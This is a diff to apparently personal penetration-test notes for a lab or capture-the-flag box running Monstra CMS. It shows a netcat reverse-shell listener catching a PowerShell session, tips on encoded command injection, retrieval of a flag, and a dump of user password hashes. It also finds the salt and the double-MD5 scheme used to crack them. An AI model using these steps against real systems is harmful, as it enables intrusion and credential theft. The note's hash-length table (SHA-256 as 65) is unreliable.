@@ -352,12 +352,12 @@ retry
 ## reversing success!
 
 1. 반드시.. enter 눌러줘야 함!
-2. 16LE format neccesary
+2. 16LE format necesary
 3. php system() 은 stdout 만 보여주므로, 에러가 오지 않아 무반응이 발생하여 원인을 유추해야 함
 4. -G and --data-urlencode must always be used in combination
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nc -lvnp 443
+└─# rlwrap nc -lvnp 443
 listening on [any] 443 ...
 connect to [192.168.45.156] from (UNKNOWN) [192.168.243.180] 49992
 
@@ -369,3 +369,90 @@ PS C:\xampp\htdocs\blog\public\themes\default>
 
 Username: MIKE-PC\Administrator
 RunAs User: MIKE-PC\Administrator
+
+PS C:\Users\Mike\Desktop> ls
+
+    Directory: C:\Users\Mike\Desktop
+
+Mode LastWriteTime Length Name
+
+---
+
+-a---- 11/1/2026 1:01 AM 34 local.txt
+
+PS C:\Users\Mike\Desktop> type local.txt
+
+![](image_35.png)
+
+get a local.txt flag
+
+> ipconfig
+
+Connection-specific DNS Suffix . :
+IPv4 Address. . . . . . . . . . . : 192.168.243.180
+Subnet Mask . . . . . . . . . . . : 255.255.255.0
+Default Gateway . . . . . . . . . : 192.168.243.254
+PS C:\Users\Mike>
+
+PS C:\xampp\htdocs\blog\storage\database> type users.table.xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+## get mike password
+
+844ffc2c7150b93c4133a6ff2e1a2dba
+
+```xml
+<root><options><autoincrement>2</autoincrement></options><fields><login/><password/><email/><role/><date_registered/><firstname/><lastname/><login/><twitter/><skype/><hash/><about_me/></fields><users><id>1</id><uid>de58425259</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>admin</login><password>a2b4e80cd640aaa6e417febe095dcbfc</password><email>wazowski@monster.pg</email><hash>jJkdUX1FOFiI</hash><date_registered>1645512776</date_registered><role>admin</role></users><users><id>2</id><uid>800c7d9797</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>mike</login><password>844ffc2c7150b93c4133a6ff2e1a2dba</password><email>mike@monster.pg</email><hash>8vPjvUPDHhRp</hash><date_registered>1645512909</date_registered><role>user</role></users></root>
+```
+
+## get admin password
+
+a2b4e80cd640aaa6e417febe095dcbfc
+
+## count hash
+
+> echo -n "844ffc2c7150b93c4133a6ff2e1a2dba" | wc -c
+
+32
+
+32 -> MD5
+65 -> SHA-256
+40 -> SHA-1
+
+## found booting file
+
+C:\xampp\htdocs\blog\boot\defines.php
+
+![](image_36.png)
+
+```php
+/**
+Set password salt
+*/
+define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
+
+/**
+ * Monstra database settings
+ */
+//define('MONSTRA_DB_DSN', 'mysql:dbname=monstra;host=localhost;port=3306');
+//define('MONSTRA_DB_USER', 'root');
+//define('MONSTRA_DB_PASSWORD', 'password');
+```
+
+## found password algorithm -> MD5 2 times
+
+```php
+/**
+   * Encrypt password
+   *
+   *  <code>
+   *      $encrypt_password = Security::encryptPassword('password');
+   *  </code>
+   *
+   * @param string $password Password to encrypt
+   */
+  public static function encryptPassword($password)
+  {
+      return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
+  }
+```
